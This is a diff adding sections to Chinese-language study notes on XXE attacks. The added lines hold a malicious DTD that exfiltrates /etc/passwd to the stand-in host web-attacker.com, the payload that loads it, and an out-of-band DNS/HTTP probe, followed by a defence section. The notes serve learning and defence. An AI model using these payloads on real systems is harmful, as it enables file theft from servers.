@@ -146,6 +146,29 @@ bin:x:2:2:bin:/bin:/usr/sbin/nologin
 - 该属性表示要以纯文本的形式解析外部文件（而不是解析为 XML）。在这个例子中，它尝试以纯文本的方式读取并包含 /etc/passwd 文件。
 - href="file:///etc/passwd"：
 - 这个 href 属性指向本地文件系统中的 /etc/passwd 文件。/etc/passwd 是 Linux/Unix 系统中的文件，包含用户的基本信息。
+## 带外攻击
+通过带外技术检测盲目 XXE 漏洞固然很好，但实际上并不能展示如何利用该漏洞。攻击者真正想要实现的是泄露敏感数据。这可以通过盲目 XXE 漏洞来实现，但它涉及攻击者在他们控制的系统上托管恶意 DTD，然后从带内 XXE 有效负载中调用外部 DTD。
+用于泄露 /etc/passwd 文件内容的恶意 DTD 示例如下：（放在自己服务器上用来导入到目标的）
+
+```
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
+%eval;
+%exfiltrate;
+```
+定义一个名为 file 的 XML 参数实体，其中包含 /etc/passwd 文件的内容。定义一个名为 eval 的 XML 参数实体，其中包含另一个名为 exfiltrate 的 XML 参数实体的动态声明。将通过向攻击者的 Web 服务器发出 HTTP 请求来评估 exfiltrate 实体，该请求包含 URL 查询字符串中 file 实体的值。使用 eval 实体，这将导致执行 exfiltrate 实体的动态声明。用 exfiltrate 实体，以便通过请求指定的 URL 来评估其值。
+然后，攻击者必须将恶意 DTD 托管在他们控制的系统上，通常是将其加载到自己的 Web 服务器上。例如，攻击者可能在以下 URL 上提供恶意 DTD：
+
+http://web-attacker.com/malicious.dtd
+最后，攻击者必须向易受攻击的应用程序提交以下 XXE 有效负载：
+
+```
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
+"http://web-attacker.com/malicious.dtd"> %xxe;]>
+```
+此技术可能不适用于某些文件内容，包括 /etc/passwd 文件中包含的换行符。这是因为某些 XML 解析器使用 API 在外部实体定义中获取 URL，该 API 会验证允许出现在 URL 中的字符。在这种情况下，可以使用 FTP 协议而不是 HTTP。有时，无法泄露包含换行符的数据，因此可以改为将 /etc/hostname 等文件作为目标
+# xxe报错从而获取数据
+利用盲 XXE 的另一种方法是触发 XML 解析错误，其中错误消息包含您希望检索的敏感数据。如果应用程序在其响应中返回生成的错误消息，这将有效。
 # 文件上传打xxe
 某些应用程序允许用户上传文件，然后在服务器端进行处理。一些常见的文件格式使用 XML 或包含 XML 子组件。基于 XML 的格式示例包括 DOCX 等办公文档格式和 SVG 等图像格式。
 例如，应用程序可能允许用户上传图像，并在上传图像后在服务器上处理或验证这些图像。即使应用程序希望接收 PNG 或 JPEG 等格式，正在使用的图像处理库也可能支持 SVG 图像。由于 SVG 格式使用 XML，攻击者可以提交恶意 SVG 图像，从而到达 XXE 漏洞的隐藏攻击面。
@@ -170,6 +193,20 @@ Content-Length: 52
 <?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
 ```
 如果应用程序容忍消息正文中包含 XML 的请求，并将正文内容解析为 XML，则只需重新格式化请求以使用 XML 格式即可到达隐藏的 XXE 攻击面。
+
+# xml参数实体
+有时，由于应用程序的某些输入验证或正在使用的 XML 解析器的某些强化，使用常规实体的 XXE 攻击被阻止。在这种情况下，您或许可以改用 XML 参数实体。XML 参数实体是一种特殊的 XML 实体==，只能在 DTD 中的其他位置引用==。就目前而言，您只需要了解两件事。首先，XML 参数实体的声明在实体名称之前包含百分号字符：
+
+<!ENTITY % myparameterentity "my parameter entity value" >
+其次，使用 percent 字符而不是通常的 & 符号引用参数实体：
+
+%myparameterentity;
+这意味着您可以通过 XML 参数实体使用带外检测来测试盲 XXE，如下所示：
+
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
+此 XXE 负载声明一个名为 xxe 的 XML 参数实体，然后在 DTD 中使用该实体。这将导致对攻击者的域进行 DNS 查找和 HTTP 请求，以验证攻击是否成功。
+
 # xxe防御
+
 几乎所有 XXE 漏洞的出现都是因为应用程序的 XML 解析库支持应用程序不需要或不打算使用的潜在危险 XML 功能。防止 XXE 攻击的最简单、最有效的方法是禁用这些功能。
 通常，禁用外部实体的解析并禁用对 XInclude 的支持就足够了。这通常可以通过配置选项或以编程方式覆盖默认行为来完成。有关如何禁用不必要功能的详细信息，请参阅 XML 解析库或 API 的文档。
